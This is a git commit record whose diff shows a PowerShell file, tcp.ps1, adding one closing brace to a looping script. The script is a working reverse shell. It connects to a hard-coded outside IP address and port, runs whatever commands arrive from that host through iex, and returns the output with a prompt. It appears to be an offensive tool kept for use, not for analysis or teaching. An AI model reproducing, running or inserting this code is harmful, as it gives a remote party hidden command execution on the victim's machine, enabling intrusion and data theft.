772afe76d5640d0bcf372d7c8f34c98ced4a715e
LUBRJ <145651445+lubrj@users.noreply.github.com>
2025-10-07 15:50:14 +0200

    Update tcp.ps1

--- tcp.ps1
+++ tcp.ps1
@@ -1,6 +1,7 @@
 while ($true) {
 try {
 $client = New-Object System.Net.Sockets.TCPClient('147.185.221.211',56063);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); 
+}
 catch {
 Write-Warning "An error occurred: $_"
 }
